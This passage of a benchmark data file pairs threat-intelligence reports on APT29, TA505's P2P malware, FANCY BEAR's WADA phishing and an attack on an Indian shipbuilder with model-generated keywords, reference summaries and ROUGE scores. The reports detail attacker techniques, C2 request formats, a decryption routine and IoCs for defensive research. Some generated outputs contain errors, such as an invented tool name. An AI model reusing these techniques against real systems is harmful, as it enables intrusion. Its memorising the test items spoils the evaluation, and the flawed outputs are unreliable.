sensitive design information about MDL's submarines and warships. - The malware communicated with a command and control server at the domain tripleshop[.]id hosted on a server in Indonesia. The attackers used obfuscated macro code and downloaded malware from a compromised university site in Indonesia to carry out the attack. - Analysis of the email headers suggests the attack may have originated from a Pakistan-based freight company called Combined Freight. Previous campaigns have also targeted Indian government organizations and embassies. - The attack shows hallmarks of a state-sponsored campaign to steal intellectual property and gain military advantages. The malware was designed to be stealthy and evade detection. Cyber espionage groups continue to target defense industries and manufacturers to steal proprietary information. <END-1>", "t5/keyword/hint_hit_precision": 0.22727272727272727, "t5/word/hint_hit_recall": 0.0411522633744856, "gpt3/lexical/rouge_rouge1": 0.4521276595744681, "gpt3/lexical/rouge_rouge2": 0.160427807486631, "gpt3/lexical/rouge_rougeL": 0.2872340425531915, "gpt3/lexical/rouge_rougeLsum": 0.2872340425531915, "gpt3_generated_text": ["A recent cyber attack targeted users associated with Mazagon Dock Shipbuilders Limited, a manufacturer of warships and submarines for the Indian Navy. The attackers sent spear-phishing emails containing malicious Excel files, posing as a legitimate Spain-based equipment manufacturing company. When the recipients opened the attachments and enabled macro content, malware was downloaded and executed on their systems. The attackers aimed to steal sensitive information related to warship and submarine designs. The malicious code was heavily obfuscated, making analysis difficult. The malware was hosted on a compromised university website to evade detection. The payload dropped an executable file in the %TEMP% directory and added a registry entry for persistence. This attack demonstrates the importance of vigilance against phishing emails and the need for strong cybersecurity measures to protect against such threats."]}, {"split_name": "val", "sample_id": "val_113", "prompt_text": "Extract the keywords: www.mandiant.com /resources/blog/apt29-continues-targeting-microsoft You Can\u2019t Audit Me: APT29 Continues Targeting Microsoft 365APT29 is a Russian espionage group that Mandiant has been tracking since at least 2014 and is likely sponsored by the Foreign Intelligence Service (SVR). Mandiant continues to identify APT29 operations targeting the United States' (US) interests, and those of NATO and partner countries. Despite the publicization of multiple APT29 operations, they continue to be extremely prolific. In 2022, APT29 has focused on organizations responsible for influencing and crafting the foreign policy of NATO countries. This has included multiple instances where APT29 revisited victims they had compromised years, or sometimes only months beforehand. This persistence and aggressiveness are indicative of sustained interest in this information and strict tasking by the Russian Government.Mandiant has observed APT29 continue to demonstrate exceptional operational security and advanced tactics targeting Microsoft 365. We are highlighting several newer TTPs used by APT29 in recent operations.Disabling LicensesMicrosoft 365 uses a variety of licensing models to control an individual user\u2019s access to services in the Microsoft 365 suite of products. The licenses can also dictate security and compliance settings such as1/3log retention and Mail Items Accessed logging within Purview Audit. The most common licenses are E1, E3, and E5; however, there are a variety of other license plans and granular add-ons that make licensing in M365 complex.For a threat actor, one of the most troublesome logging features is Purview Audit, formerly Advanced Audit. This feature, available with E5 licenses and certain add-ons, enables the Mail Items Accessed audit. Mail Items Accessed records the user-agent string, timestamp, IP address, and user each time a mail item is accessed. The audit records any type of mail access whether it is using the Graph API, Outlook, a browser, or other methodology. This is a critical log source to determine if a threat actor is accessing a particular mailbox, as well as to determine the scope of exposure. Further, it is the only way to effectively determine access to a particular mailbox when the threat actor is using techniques like Application Impersonation or the Graph API.Mandiant has observed APT29 disabling Purview Audit on targeted accounts in a compromised tenant. Once disabled, they begin targeting the inbox for email collection. At this point, there is no logging available to the organization to confirm which accounts the threat actor targeted for email collection and when. Given APT29\u2019s targeting and TTPs Mandiant believes that email collection is the most likely activity following disablement of Purview Audit. We have updated our white paper, Remediation and Hardening Strategies for Microsoft 365 to include more details on this technique as well as detection and remediation advice. Additionally, we have updated the Azure AD Investigator with a new module to report on users with advanced auditing disabled.MFA Takeover of Dormant AccountsMulti-factor authentication (MFA) is a crucial tool that organizations can deploy to thwart account takeover attacks by threat actors. By requiring users to provide both something they know and something they have, organizations can significantly reduce the risk of account compromise. MFA itself, however, is not a silver bullet. Mandiant has previously discussed how threat actors abuse push-based MFA to spam users with notifications until they eventually accept the prompt and allow the threat actor access. Microsoft has recently announced that they will roll out MFA push notification with number matching to combat this.Mandiant has begun to observe another trend where threat actors, including APT29, take advantage of the self-enrollment process for MFA in Azure Active Directory and other platforms. When an organization first enforces MFA, most platforms allow users to enroll their first MFA device at the next login. This is often the workflow chosen by organizations to roll out MFA. In Azure AD and other platform\u2019s default configuration, there are no additional enforcements on the MFA enrollment process. In other words, anyone with knowledge of the username and password can access the account from any location and any device to enroll MFA, so long as they are the first person to do it.In one instance, APT29 conducted a password guessing attack against a list of mailboxes they had obtained through unknown means. The threat actor successfully guessed the password to an account that had been setup, but never used. Because the account was dormant, Azure AD prompted APT29 to enroll in MFA. Once enrolled, APT29 was able to use the account to access the organization\u2019s\u2019 VPN infrastructure that was using Azure AD for authentication and MFA. Mandiant recommends that organizations ensure all active accounts have at least one MFA device enrolled and work with their platform vendor to add additional verifications to the MFA enrollment process. Microsoft Azure AD2/3recently rolled out a feature to allow organizations to enforce controls around specific actions such as MFA device enrollment. Using conditional access, Organizations can restrict the registration of MFA devices to only trusted locations, such as the internal network, or trusted devices. Organizations can also choose to require MFA to enroll MFA. To avoid the chicken-and-egg situation this creates, help desk employees can issue Temporary Access Passes to employees when they first join or if they lose their MFA device. The pass can be used for a limited time to login, bypass MFA, and register a new MFA device.Focus on Operational SecurityAPT29 continues to demonstrate exceptional operational security and evasion tactics. In addition to the use of residential proxies to obfuscate their last mile access to victim environments, Mandiant has observed APT29 turn to Azure Virtual Machines. The virtual machines used by APT29 exist in Azure subscriptions outside of the victim organization. Mandiant does not know if these subscriptions have been compromised or purchased by APT29. Sourcing their last-mile access from trusted Microsoft IP addresses reduces the likelihood of detection. Because Microsoft 365 itself runs on Azure, the Azure AD Sign-In and Unified Audit Logs already contain many Microsoft IP addresses and it can be hard to quickly determine if an IP address belongs to a malicious VM or a backend M365 service. From Mandiant\u2019s own observation it also appears that Microsoft owned IP addresses greatly reduce the risk of detection by Microsoft\u2019s risky sign-ins and risky users reports.Mandiant has also observed APT29 mix benign administrative actions with their malicious ones. For example, in a recent investigation APT29 gained access to a global administrator account in Azure AD. They used the account to backdoor a service principal with ApplicationImpersonation rights and start collecting email from targeted mailboxes in the tenant. To accomplish this, APT29 added a new certificate, or Key Credential, to the service principal. Once added, APT29 was able to authenticate to Azure AD as the Service Principal and use its roles to collect email. To blend in, APT29 created the certificate with a Common Name (CN) that matched the display name of the backdoored service principal. In addition to this, they also added a new Application Address URL to the service principal. The address they added was completely benign, not needed to facilitate their malicious activities, and was related to the functionality of the application as documented by the vendor. This action demonstrates the extremely high level of preparation that APT29 takes and the extent to wish they try to masquerade their actions as legitimate. OutlookAPT29 continues to develop its technical tradecraft and dedication to strict operational security. Mandiant expects that APT29 will stay apace with the development of techniques and tactics to access Microsoft 365 in novel and stealthy ways.3/3 ", "generated_text": "Mandiant; Russian; at least 2014; Russia; NATO; organizations; 2022; 2022; the US; US interests; NATO; partners; the Russian Government; a variety; licensing models; an individual user; access; services; the Microsoft 365 suite; products; the licenses; Security; compliance; the Mail Items; Accessed logging; the Mail Items; the user-agent string; timestamp; IP address; users; each time a mail item is accessed; the audit; any type; mail access; the Graph API; Outlook; browser; other methodology; this is a critical log source; if a threat actor is accessing a particular mailbox; the scope; exposure; a particular mailbox; the threat actor; the inbox; email collection; the most likely activity; the disabling of Purview Audit; the inbox; email collection; the organization; time; MFA; the self-enrollment process; MFA Takeover; Dormant Accounts; multi-factor authentication; MFA takeover; Microsoft; the group.", "ref_text": "<START-1>Here is a summary of the key points from the Mandiant report on APT29's targeting of Microsoft 365: The Russian state-sponsored hacking group APT29 continues to aggressively target organizations involved in shaping NATO countries' foreign policy. They frequently re-compromise victims they've breached previously. APT29 is demonstrating advanced tactics for evading detection and masking their activities in Microsoft 365 environments. They have been observed disabling logging features like Purview Audit on compromised accounts before collecting emails. This prevents logs that would show their mailbox access. The group is taking over dormant Microsoft 365 accounts by resetting passwords and quickly enrolling multi-factor authentication. This bypasses MFA protections. To hide their last-mile attacks, APT29 uses Azure virtual machines outside the victim's subscription. The Microsoft IP addresses are less likely to raise alerts. The group intersperses benign admin actions on accounts/apps among their malicious activity. This masquerades adversarial actions as legitimate administrator behavior. Overall, APT29 continues honing their tradecraft for stealthy Microsoft 365 intrusions. They rapidly adopt new techniques for accessing cloud environments while erasing their tracks. <END-1>", "t5/keyword/hint_hit_precision": 0.16666666666666666, "t5/word/hint_hit_recall": 0.07514450867052024, "gpt3/lexical/rouge_rouge1": 0.391304347826087, "gpt3/lexical/rouge_rouge2": 0.072992700729927, "gpt3/lexical/rouge_rougeL": 0.20289855072463767, "gpt3/lexical/rouge_rougeLsum": 0.20289855072463767, "gpt3_generated_text": ["Mandiant has been tracking APT29, a Russian espionage group likely sponsored by the SVR, since at least 2014. Despite public disclosures of their operations, APT29 continues to target US, NATO, and partner country interests with persistence and aggressiveness. In 2022, they have focused on organizations influencing foreign policy. Mandiant has observed APT29 using advanced tactics to target Microsoft 365, including disabling Purview Audit to collect emails without detection. They have also exploited the MFA self-enrollment process to takeover dormant accounts. These tactics highlight the group's exceptional operational security and ongoing threat to organizations."]}, {"split_name": "val", "sample_id": "val_114", "prompt_text": "Extract the keywords: Tracking a P2P network related to TA505research.nccgroup.com/2021/12/01/tracking-a-p2p-network-related-with-ta505/This post is by Nikolaos Pantazopoulos and Michael SandeeDecember 1, 2021tl;dr \u2013 Executive Summary For the past few months NCC Group has been closely tracking the operations of TA505 and the development of their various projects (e.g. Clop). During this research we encountered a number of binary files that we have attributed to the developer(s) of \u2018Grace\u2019 (i.e. FlawedGrace). These included a remote administration tool (RAT) used exclusively by TA505. The identified binary files are capable of communicating with each other through a peer-to-peer (P2P) network via UDP. While there does not appear to be a direct interaction between the identified samples and a host infected by \u2018Grace\u2019, we believe with medium to high confidence that there is a connection to the developer(s) of \u2018Grace\u2019 and the identified binaries.In summary, we found the following:P2P binary files, which are downloaded along with other Necurs components (signed drivers, block lists) P2P binary files, which transfer certain information (records) between nodes Based on the network IDs of the identified samples, there seem to be at least three different networks running The programming style and dropped file formats match the development standards of \u2018Grace\u2019History of TA505\u2019s Shift to Ransomware Operations2014: Emergence as a group The threat actor, often referred to as TA505 publicly, has been distinguished as an independent threat actor by NCC Group since 2014. Internally we used the name \u201cDridex RAT group\u201d. Initially it was a group that integrated quite closely with EvilCorp, utilising their Dridex banking malware platform to execute relatively advanced attacks, using often custom made tools for a single purpose and repurposing commonly available tools such as \u2018Ammyy Admin\u2019 and \u2018RMS\u2019/\u2019RUT\u2019 to complement their arsenal. The attacks performed mostly consisted of compromising organisations and social engineering victims to execute high value bank transfers to corporate mule accounts. These operations included social engineering correctly implemented two-factor authentication with dual authorization by both the creator of a transaction and the authorizee.2017: Evolution Late 2017, EvilCorp and TA505 (Dridex RAT Group) split as a partnership. Our hypothesis is that EvilCorp had started to use the Bitpaymer ransomware to extort organisations rather than doing banking fraud. This built on the fact they had already been using the Locky ransomware previously and was attracting unwanted attention. EvilCorp\u2019s ability to execute enterprise ransomware across large- scale businesses was first demonstrated in May 2017. Their capability and success at pulling off such attacks stemmed from the numerous years of experience in compromising corporate networks for banking fraud activity, specifically moving laterally to separate hosts controlled by employees who had the required access and control of corporate bank accounts. The same techniques in relation to lateral movement and tools (such as Empire, Armitage, Cobalt Strike and Metasploit) enabled EvilCorp to become highly effective in targeted ransomware attacks.However in 2017 TA505 went on their own path and specifically in 2018 executed a large number of attacks using the tool called \u2018Grace\u2019, also known publicly as \u2018FlawedGrace\u2019 and \u2018GraceWire\u2019. The victims were mostly financial institutions and a large number of the victims were located in Africa, South Asia, and South East Asia with confirmed fraudulent wire transactions and card data theft originating from victims of TA505. The tool \u2018Grace\u2019 had some interesting features, and showed some indications that it was originally designed as banking malware which had latterly been repurposed. However, the tool was developed and was used in hundreds of victims worldwide, while remaining relatively unknown to the wider public in its first years of use.2019: Clop and wider tooling In early 2019, TA505 started to utilise the Clop ransomware, alongside other tools such as \u2018SDBBot\u2019 and \u2018ServHelper\u2019, while continuing to use \u2018Grace\u2019 up to and including 2021. Today it appears that the group has realised the potential of ransomware operations as a viable business model and the relative ease with which they can extort large sums of money from victims.The remainder of this post dives deeper into a tool discovered by NCC Group that we believe is related to TA505 and the developer of \u2018Grace\u2019. We assess that the identified tool is part of a bigger network, possibly related with Grace infections.Technical Analysis The technical analysis we provide below focuses on three components of the execution chain:1. A downloader \u2013 Runs as a service (each identified variant has a different name) and downloads the rest of the components alongwith a target processes/services list that the driver uses while filtering information. Necurs have used similar downloaders in the past.1/52. A signed driver (both x86 and x64 available) \u2013 Filters processes/services in order to avoid detection and/or prevent removal. Inaddition, it injects the payload into a new process.3. Node tool \u2013 Communicates with other nodes in order to transfer victim\u2019s data.It should be noted that for all above components, different variations were identified. However, the core functionality and purposes remain the same.Upon execution, the downloader generates a GUID (used as a bot ID) and stores it in the ProgramData folder under the filename regid.1991-06.com.microsoft.dat . Any downloaded file is stored temporarily in this directory. In addition, the downloader reads the version of crypt32.dll in order to determine the version of the operating system.Next, it contacts the command and control server and downloads the following files:t.dat \u2013 Expected to contain the string \u2018kwREgu73245Nwg7842h\u2019 p3.dat \u2013 P2P Binary. Saved as \u2018payload.dll\u2019 d1c.dat \u2013 x86 (signed) Driver d2c.dat \u2013 x64 (signed) Driver bn.dat \u2013 List of processes for the driver to filter. Stored as \u2018blacknames.txt\u2019 bs.dat \u2013 List of services\u2019 name for the driver to filter. Stored as \u2018blacksigns.txt\u2019 bv.dat \u2013 List of files\u2019 version names for the driver to filter. Stored as \u2018blackvers.txt\u2019. r.dat \u2013 List of registry keys for the driver to filter. Stored as \u2018registry.txt\u2019The network communication of the downloader is simple. Firstly, it sends a GET request to the command and control server, downloads and saves on disk the appropriate component. Then, it reads the component from disk and decrypts it (using the RC4 algorithm) with the hardcoded key \u2018ABCDF343fderfds21\u2019. After decrypting it, the downloader deletes the file.Depending on the component type, the downloader stores each of them differently. Any configurations (e.g. list of processes to filter) are stored in registry under the key HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\CLSID with the value name being the thread ID of the downloader. The data are stored in plaintext with a unique ID value at the start (e.g. 0x20 for the processes list), which is used later by the driver as a communication method.In addition, in one variant, we detected a reporting mechanism to the command and control server for each step taken. This involves sending a GET request, which includes the generated bot ID along with a status code. The below table summarises each identified request (Table 1).RequestDescription/c/p1/dnsc.php?n=%s&in=%sFirst parameter is the bot ID and the second is the formatted string (\u201cVersion_is_%d.%d_(%d)_%d__ARCH_%d\u201d), which contains operating system info/c/p1/dnsc.php? n=%s&sz=DS_%d/c/p1/dnsc.php? n=%s&er=ERR_%dFirst parameter is the bot ID and the second is the downloaded driver\u2019s sizeFirst parameter is the bot ID and the second is the error code/c/p1/dnsc.php?n=%s&c1=1The first parameter is the bot ID. Notifies the server that the driver was installed successfully/c/p1/dnsc.php? n=%s&c1=1&er=REB_ERR_%dFirst parameter is the bot ID and the second is the error code obtained while attempting to shut down the host after finding Windows Defender running/c/p1/dnsc.php? n=%s&sz=ErrList_%d_%First parameter is the bot ID, second parameter is the resulted error code while retrieving the blocklist processes. The third parameter is set to 1. The same command is also issued after downloading the blacklisted services\u2019 names and versions. The only difference is on the third parameter, which is increased to \u20182\u2019 for blacklisted services, \u20183\u2019 for versions and \u20184\u2019 for blacklisted registry keys/c/p1/dnsc.php? n=%s&er=PING_ERR_%dFirst parameter is the bot ID and the second parameter is the error code obtained during the driver download process/c/p1/dnsc.php? n=%s&c1=1&c2=1First parameter is the bot ID. Informs the server that the bot is about to start the downloading process./c/p1/dnsc.php? n=%s&c1=1&c2=1&c3=1First parameter is the bot ID. Notified the server that the payload (node tool) was downloaded and stored successfullyTable 1 \u2013 Reporting to C2 requestsDriver Analysis The downloaded driver is the same one that Necurs uses. It has been analysed publically already [1] but in summary, it does the following.In the first stage, the driver decrypts shellcode, copies it to a new allocated pool and then executes the payload. Next, the shellcode decrypts and runs (in memory) another driver (stored encrypted in the original file). The decryption algorithm remains the same in both cases:2/5xor_key = extracted_xor_key for i in range(0,payload_size,4):data = encrypted[i:i+4] value = int.from_bytes (data, 'little' )^ xor_key result += ( _rol(value, bits, 32) ^ xor_key).to_bytes(4,'little')Eventually, the decrypted driver injects the payload (the P2P binary) into a new process (\u2018wmiprvse.exe\u2019) and proceeds with the filtering of data.A notable piece of code of the driver is the strings\u2019 decryption routine, which is also present in recent GraceRAT samples, including the same XOR key (1220A51676E779BD877CBECAC4B9B8696D1A93F32B743A3E6790E40D745693DE58B1DD17F65988BEFE1D6C62D5416B25BB78EF06Payload Attribution and Analysis The identified sample is written in C++ and interacts with other nodes in the network using UDP. We believe that the downloaded binary file is related with TA505 for (at least) the following reasons:1. Same serialisation library 2. Same programming style with \u2018Grace\u2019 samples 3. Similar naming convention in the configuration\u2019s keys with \u2018Grace\u2019 samples 4. Same output files (dsx), which we have seen in previous TA505 compromises. DSX files have been used by \u2018Grace\u2019 operators tostore information related with compromised machines.Initialisation Phase In the initialisation phase, the sample ensures that the configurations have been loaded and the appropriate folders are created.All identified samples store their configurations in a resource with name XC .ANALYST NOTE: Due to limit visibility of other nodes, we were not able to identify the purpose of each key of the configurations.The first configuration stores the following settings:cx \u2013 Parent name nid \u2013 Node ID. This is used as a network identification method during network communication. If the incoming network packet does not have the same ID then the packet is treated as a packet from a different network and is ignored. dgx \u2013 Unknown exe \u2013 Binary mode flag (DLL/EXE) key \u2013 RSA key to use for verifying a record port \u2013 UDP port to listen va \u2013 Parent name. It includes the node IPs to contact.The second configuration contains the following settings (or metadata as the developer names them):meta \u2013 Parent name app \u2013 Unknown. Probably specifies the variant type of the server. The following seem to be supported:target (this is the current set value) controlmod \u2013 Specifies if current binary is the core module. llt- UnknownNext, the sample creates a set of folders and files in a directory named \u2018target\u2019. These folders are:node (folder) \u2013 Stores records of other nodes trash (folder) \u2013 Move files for deletion units (folder) \u2013 Unknown. Appears to contain PE files, which the core module loads. sessions (folder) \u2013 Active nodes\u2019 sessions units.dsx (file) \u2013 List of \u2018units\u2019 to load probes.dsx (file) \u2013 Stores the connected nodes IPs along with other metadata (e.g. connection timestamp, port number) net.dsx (file) \u2013 Node peer name reports.dsx (file) \u2013 Used in recent versions only. Unknown purpose.Network communication After the initialisation phase has been completed, the sample starts sending UDP requests to a list of IPs in order to register itself into the network and then exchange information.3/5Every network packet has a header, which has the below structure:struct Node_Network_Packet_Header {BYTE XOR_Key; BYTE Version; // set to 0x37 ('7') BYTE Encrypted_node_ID[16]; // XORed with XOR_Key above BYTE Peer_Name[16]; // Xored with XOR_Key above. Connected peer name BYTE Command_ID; //Internally called frame type DWORD Watermark; //XORed with XOR_Key above DWORD Crc32_Data; //CRC32 of above data};When the sample requires adding additional information in a network packet, it uses the below structure:struct Node_Network_Packet_Payload BYTE Data[Size]; // Xored with same key used in the header packet (XOR_Key)};As expected, each network command (Table 2) adds a different set of information in the \u2018Data\u2019 field of the above structure but most of the commands follow a similar format. For example, an \u2018invitation\u2019 request (Command ID 1) has the structure:struct Node_Network_Invitation_Packet BYTE Invitation_ID[16]; BYTE Node_Peer_Name[16]; WORD Node_Binded_Port;};The sample supports a limited set of commands, which have as a primary role to exchange \u2018records\u2019 between each other.Command ID Description123456789Requests to register in the other nodes (\u2018invitation\u2019 request)Adds node IP to the probes listSends a ping request. It includes number of active connections and recordsSends number of active connections and records in the nodeAdds a new node IP:Port that the remote node will checkSends a record ID along with the number of data blocksRequests metadata of a recordSends metadata of a recordRequests the data of a record10Receives data of a record and store them on diskTable 2 \u2013 Set of command IDsANALYST NOTE: When information, such as record IDs or number of active connections/records, is sent, the binary adds the length of the data followed by the actual data. For example, in case of sending number of active connections and records:01 05 01 02 01 02The above is translated as:2 active connections from a total of 5 with 2 records.Moreover, when a node receives a request, it sends an echo reply (includes the same packet header) to acknowledge that the request was read. In general, the following types are supported:Request type of 0x10 for echo request. Request type of 0x07 when sending data, which fit in one packet. Request type of 0xD when sending data in multiple packets (size of payload over 1419 bytes). Request type 0x21. It exists in the binary but not supported during the network communications.Record files As mentioned already, a record has its own sub-folder under the \u2018node\u2019 folder with each sub-folder containing the below files:m \u2013 Metadata of record file4/5l \u2013 Unknown purpose p \u2013 Payload dataThe metadata file contains a set of information for the record such as the node peer name and the node network ID. Among this information, the keys \u2018tag\u2019 and \u2018pwd\u2019 appear to be very important too. The \u2018tag\u2019 key represents a command (different from table 2 set) that the node will execute once it receives the record. Currently, the binary only supports the command \u2018updates\u2019. The payload file (p) keeps the updated content encrypted with the value of key \u2018pwd\u2019 being the AES key.Even though we have not been able yet to capture any network traffic for the above command, we believe that it is used to update the current running core module.IoCsNodes\u2019 IPs 45.142.213[.]139:555195.123.246[.]14:55545.129.137[.]237:3396478.128.112[.]139:33964145.239.85[.]6:3333BinariesSHA-1DescriptionA21D19EB9A90C6B579BCE8017769F6F58F9DADB1 P2P Binary2F60DE5091AB3A0CE5C8F1A27526EFBA2AD9A5A7P2P Binary2D694840C0159387482DC9D7E59217CF1E365027P2P Binary02FFD81484BB92B5689A39ABD2A34D833D655266x86 DriverB4A9ABCAAADD80F0584C79939E79F07CBDD49657x64 Driver00B5EBE5E747A842DEC9B3F14F4751452628F1FEX64 Driver22F8704B74CE493C01E61EF31A9E177185852437DownloaderD1B36C9631BCB391BC97A507A92BCE90F687440ADownloaderReferencesTable 3 \u2013 Binaries hashes1. url ", "generated_text": "tracking; NCC Group; TA505; FlawedGrace; a remote administration tool; RAT; PE; a peer-to-peer (P2P) network; UDP; the identified binary files; information; records; the network IDs; at least three different networks; the programming style; dropped file formats; the development standards; FlawedGrace; the Clop ransomware; 2019; ClopWire; SDBBot; ServHelper; hundreds; victims; South Asia; South East Asia; financial institutions; the group; the potential; ransomware operations; a viable business model; lateral movement; the threat actor; an independent threat actor.", "ref_text": "<START-1>The PDF describes research by NCC Group tracking a peer-to-peer (P2P) network used by the threat actor TA505, known for distribution of banking trojans and ransomware. The P2P network includes a downloader, signed driver, and node tool that communicate via UDP. The node tool exchanges records between peers. The programming style matches that of the GraceRAT malware used by TA505. The downloader fetches the other components from a command and control server, decrypts them, and installs them. The signed driver filters system information to avoid detection, injects the node tool payload, and reports back to the C2. The node tool communicates with other peers to exchange records containing metadata and encrypted payloads. The records appear to be used to distribute updates. While no interaction with GraceRAT was observed, the attribution to GraceRAT developers is based on code similarities. The research provides indicators of compromise on the components and notes that TA505 has shifted focus to ransomware operations for financial gain. The P2P network allows TA505 to distribute tools and updates while avoiding centralized infrastructure that could be taken down. The tools evolve but TA505 continues to pose a threat by compromising corporate networks. <END-1>", "t5/keyword/hint_hit_precision": 0.2857142857142857, "t5/word/hint_hit_recall": 0.09844559585492228, "gpt3/lexical/rouge_rouge1": 0.415954415954416, "gpt3/lexical/rouge_rouge2": 0.10888252148997134, "gpt3/lexical/rouge_rougeL": 0.22222222222222224, "gpt3/lexical/rouge_rougeLsum": 0.22222222222222224, "gpt3_generated_text": ["This article by NCC Group explores the tracking of a P2P network related to the threat actor TA505 and their development of various projects, such as Clop. The researchers discovered binary files attributed to the developer(s) of 'FlawedGrace', including a RAT used exclusively by TA505. These binary files are capable of communicating through a P2P network via UDP, transferring information between nodes. The analysis revealed at least three different networks running, matching the programming style and file formats of 'Grace'. The history of TA505's shift to ransomware operations, including the evolution from banking fraud to ransomware attacks using tools like 'Grace', Clop, SDBBot, and ServHelper, targeting financial institutions in South Asia and South East Asia. The group has realized the potential of ransomware as a profitable business model, leveraging their expertise in lateral movement within corporate networks. This research provides valuable insights into the tactics and tools utilized by TA505 in their cyber operations."]}, {"split_name": "val", "sample_id": "val_115", "prompt_text": "Extract the keywords: August 19, 2016 Russian Cyber Operations on SteroidsIn Blog, Featured Article, Threat ResearchRussian Cyber Operations On SteroidsThreatConnect Identi es FANCY BEAR Ties to World Anti-Doping Agency PhishingRead the full series of ThreatConnect posts following the DNC Breach: \u201cRebooting Watergate: Tapping into the Democratic National Committee [url democratic-national-committee/] \u201d, \u201cShiny Object? Guccifer 2.0 and the DNC Breach [url breach/] \u201c, \u201cWhat\u2019s in a Name Server? [url \u201c, \u201cGuccifer 2.0: the Man, the Myth, the Legend? [url claims/] \u201c, \u201cGuccifer 2.0: All Roads Lead to Russia [url \u201c,\u201cFANCY BEAR Has an (IT) Itch that They Can\u2019t Scratch [url scratch/] \u201c, \"Does a BEAR Leak in the Woods? [url woods/] \", \"Russian Cyber Operations on Steroids [url agency-phishing/] \", and \"Can a BEAR Fit Down a Rabbit Hole? [url hole/] \".On August 15, the World Anti-Doping Agency (WADA) alerted stakeholders [url phishing-scams] to phishing emails that used domains spoo ng the WADA\u2019s legitimate domain, wada-ama.org. WADA con rmed [url rms- illegal-activity-on-yuliya-stepanovas-adams-account] that some users had received illegitimate credential harvesting e-mails that look as though they came from the WADA. The domains in the alert included:wada-awa[.]org wada-arna[.]orgThreatConnect\u2019s Research team reviewed these domains and found that the sites were recently registered and their registration and hosting information are consistent with Russian FANCY BEAR tactics, techniques, and procedures (TTPs), as shown in the diamond model below. Further, we also identi ed another domain registered by the same individuals -- tas-cass[.]org -- that spoofs the Court of Arbitration for Sport\u2019s (CAS) legitimate tas-cas.org domain.WADA\u2019s alert follows news from mid-August that WADA accounts and servers had been compromised. On August 11, a group identifying themselves as Anonymous Poland (@anpoland) defaced the CAS website [url hackers/] and leaked data stolen from WADA and CAS servers [url . On August 13, the WADA [url ama.org/en/media/news/2016-08/wada-con rms-illegal-activity-on- yuliya-stepanovas-adams-account] and email [url whistleblower-yuliya-stepanova-hacked-wada] accounts belonging to Yuliya Stepanova, the Russian athlete who was called \u201cJudas [url stepanova-rio-olympics.html] \u201d by Vladimir Putin for helping to blow the whistle on the state sponsored doping scandal, were hacked.We assess that the phishing and Stepanova\u2019s compromise most likely are part of targeted activity by Russian actors in response to thewhistleblower and the WADA\u2019s recommendation to ban all Russian athletes from the Olympic and Paralympic games in Rio de Janeiro, Brazil. Successful operations against these individuals and organizations could facilitate Russian e orts to privately or publically intimidate them or other potential whistleblowers. At this time, we are skeptical of @anpoland\u2019s origins but cannot determine the extent to which, if any, they are a Russian platform similar to Guccifer 2.0 or DCLeaks.W H I T E P A P E R : 6 E A S Y W A Y S T O A D V A N C E Y O U R C Y B E R S E C U R I T Y P R O G R A M [ H T T P : / / H U B S . L Y / H 0 3 S M T B 0 ]ThreatConnect made a concerted e ort to alert WADA and CAS to these  ndings and have shared indicators from this activity in ThreatConnect\u2019s Incident 20160818A: Activity Targeting the WADA and CAS [url incident=1412887] .WADA and CAS BackgroundAn international independent agency, the WADA [url ama.org/en] is not only composed of, but funded by governments and the sport movement worldwide. One of the organization\u2019s primary responsibilities is to monitor the World Anti-Doping Code [url .The CAS [url is a the highest international tribunal that was established to settle disputes related to sport through arbitration. Starting in 2016, an anti-doping division of CAS began judging doping cases at the Olympic Games, replacing the IOC disciplinary commission.McLaren Report and Russian Athletes BannedIn 2014, Stepanova, a Russian track athlete, and her husband, a former employee of the Russian Anti-Doping Agency, appeared in a documentary [url Skript.pdf] accusing the Russian sports system of large-scale doping fraud. They indicated that Russian athletics o cials supplied banned substances in exchange for 5% of an athlete's earnings and falsi ed tests together with doping control o cers.In May 2016, Dr. Grigory Rodchenkov [url europe-36833962] , the former Director of Moscow and Sochi doping control laboratories, further alleged and detailed [url olympics-2014.html?_r=2] widespread e orts facilitated by Russian intelligence services to circumvent positive testing results for Russian athletes. The WADA then engaged Professor Richard McLaren [url richard-mclaren/] to investigate allegations of Russian state manipulation of the doping control process for Russian athletes. On July 18, the results of McLaren\u2019s investigation were released in a report [url process/mclaren-independent-investigations-report-into-sochi- allegations] that included  ndings on Moscow\u2019s involvement in circumventing the testing process, including:The State had the ability to transform a positive analytical result into a negative one by ordering that the analytical process of the Moscow Laboratory be altered. The Ministry of Sport (\u201cMofS\u201d), Russian Anti- Doping Agency (RUSADA) and the Russian Federal Security Service (the \u201cFSB\u201d) were all involved in this operation.The MofS directed, controlled and oversaw the manipulation of athletes\u2019 analytical results and sample swapping, with the active participation and assistance of the FSB; the Center of Sports Preparation of National Teams of Russia (CSP); and, both Moscow and Sochi laboratories.Following the report, the WADA recommended [url ama.org/en/media/news/2016-07/wada-statement-independent- investigation-con rms-russian-state-manipulation-of] that all Russian Olympic and Paralympic athletes be banned from the Rio games. The IOC ultimately cleared 271 of the 389 Olympic athletes for competition and the CAS upheld the ban [url olympics-doping-idUSKCN101108] while the International Paralympic Committee (IPC) banned the entire Russian Paralympic team from participation.FANCY BEAR ConsistenciesInvestigating the two domains provided in the WADA alert [url scams] -- wada-awa[.]org and wada-arna[.]org -- using SOA and WHOIS records we were able to identify that they were registered by rob_parks@mail[.]com and macie.dietrich50@mail[.]com respectively. Leveraging capabilities from our partners at DomainTools [url , we were able to identify that macie.dietrich50@mail[.]com had also registered one other domain -- tas-cass[.]org -- approximately three hours before registering wada- arna[.]org on August 8th. We found no other domains registered by rob_parks@mail[.]com.The wada-awa[.]org and tas-cass[.]org domains are currently hosted at the same 81.95.5[.]166 (Germany) IP address with no other domains. While these domains were registered using di erent email addresses, their hosting at the same IP with no other domains suggests they were registered by the same individual or group. The wada-arna[.]org domain is currently hosted on a dedicated server at 149.154.157[.]171 (Italy).Based on passive DNS resolutions identi ed through PassiveTotal [url and our integration with Farsight, [url we were able to identify that several subdomains for these domains are currently hosted on these IPaddresses. These subdomains most likely have been used in operations against the WADA and/or CAS:mail.wada-awa[.]org inside.wada-arna[.]org adfs.wada-awa[.]orgAfter taking a look at the name server information for the domains, we identi ed that wada-awa[.]org was registered and uses a name server from ITitch[.]com, a domain registrar that FANCY BEAR actors recently used to register a domain for operations against the Democratic Congressional Campaign Committee [url . Wada-arna[.]org and tas-cass[.]org were registered through and use name servers from Domains4bitcoins[.]com, a registrar that has also been associated [url server/] with FANCY BEAR activity. Concentrations of FANCY BEAR domains have been found on the name servers for both of these registrars, and the registrars\u2019 acceptance of anonymous Bitcoin payment is desirable for actors seeking to avoid attribution. The diamond model [url 